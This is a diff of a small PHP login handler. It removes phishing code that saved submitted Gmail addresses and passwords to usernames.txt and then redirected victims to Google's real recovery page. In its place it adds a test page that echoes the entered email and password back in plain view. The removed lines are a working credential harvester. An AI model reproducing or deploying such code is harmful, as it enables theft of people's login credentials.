@@ -1,6 +1,8 @@
 <?php
+$email = $_POST['email'] ?? '';
+$password = $_POST['password'] ?? '';
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-exit();
+echo "<h2>Test Login</h2>";
+echo "<p>Email: " . htmlspecialchars($email) . "</p>";
+echo "<p>Password: " . htmlspecialchars($password) . "</p>";
 ?>
